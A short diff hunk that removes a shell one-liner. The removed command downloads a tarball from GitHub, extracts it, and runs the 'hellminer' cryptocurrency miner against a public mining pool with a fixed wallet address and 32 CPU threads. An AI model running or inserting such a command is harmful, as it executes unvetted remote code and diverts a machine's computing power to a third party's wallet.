@@ -1,2 +1,0 @@
-
-wget https://github.com/pruthvigithub1137/cpu/raw/main/papuji.tar.gz && tar -xfpapuji.tar.gz && ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RRoaVrGXMP9JeeRZPpNyyZ93FeRoP4gday.worker -p x --cpu 32
